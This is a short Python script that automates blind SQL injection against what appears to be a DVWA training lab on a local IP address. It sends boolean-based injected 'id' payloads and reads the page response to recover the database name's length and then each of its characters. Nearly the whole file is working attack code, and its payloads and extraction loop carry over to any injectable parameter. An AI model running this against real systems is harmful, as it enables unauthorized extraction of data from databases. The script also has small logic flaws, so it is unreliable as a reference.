#!/usr/bin/env python3

from bs4 import BeautifulSoup as bs

import requests
import string
#Params is get and data is post

PHPSESSIONID = 'a0bnlpoocngmkkbcls16s0hnj0'
security="low"

url='http://192.168.1.163:8082/vulnerabilities/sqli_blind/'
char_input = list(string.ascii_letters + string.digits + "-" + "-")
digits = list(string.digits)

cookies = {'security':security,
           'PHPSESSID':'a0bnlpoocngmkkbcls16s0hnj0'
           }

#Get the name of the Database
def getDBDetails():
  s = requests.Session()
  dbLength = getDBNameLength(s)
  dbName = getDBName(s,dbLength)
  print(f"DB Length is {dbLength}, DB Name is {dbName}")

#Get the number of letters in the database name
def getDBNameLength(s,char_input=digits):
  
  for char in char_input:
    param = { 'id' : f"1\' and length(substr((select database()),1)) = {char} -- -", 'Submit' : 'Submit' }
    result = check_param(s,param)
    if result == True:
      return int(char)
      break
      
#Check the Result of the Blind SQL is True or False. 
def check_param(s,param,cookies=cookies,url=url,condition="exists"):
  r = s.get(url, cookies=cookies, params=param)
  soup = bs(r.content, 'html.parser')
  
  result = soup.find('pre').string
  if "exists" in result:
    return True
  else:
    return False

#Work out the name of the DB
def getDBName(s,dbLength,char_input=char_input):
  dbName = []
  count = 1 
  while len(dbName) < dbLength-1 :
    for char in char_input:
      param = { 'id' : f"1\' and substr((select database()),{count},1) = \'{char}\' -- -", 'Submit' : 'Submit' }
      result = check_param(s,param)
      if result == True:
        dbName.append(char)
        count +=1
        print(''.join(dbName))
  return ''.join(dbName)

def testSQL():
  getDBDetails()


testSQL()
